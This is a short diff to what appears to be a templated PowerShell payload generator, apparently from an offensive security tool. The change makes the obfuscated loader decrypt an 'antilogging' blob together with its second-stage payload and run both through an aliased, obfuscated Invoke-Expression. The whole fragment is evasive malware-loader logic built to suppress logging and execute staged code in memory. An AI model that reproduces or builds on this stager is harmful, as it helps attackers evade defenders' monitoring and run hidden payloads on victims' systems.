@@ -44,7 +44,7 @@ function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetStri
 {{'Write-Debug "Load 2nd stage..."'|debug}}
 
 {% if obfuscate_setalias %}{{set_alias()}}{% else %}sal{% endif %} {{symbol_name("InvokeExpressionAlias")}} {{obfuscate("Invoke-Expression")}};
-{{symbol_name("Decrypt-String")}} "{{stage2}}" | {{symbol_name("InvokeExpressionAlias")}};
+({{symbol_name("Decrypt-String")}} "{{antilogging}}"), ({{symbol_name("Decrypt-String")}} "{{stage2}}") | {{symbol_name("InvokeExpressionAlias")}};
 
 {{separator}}
 
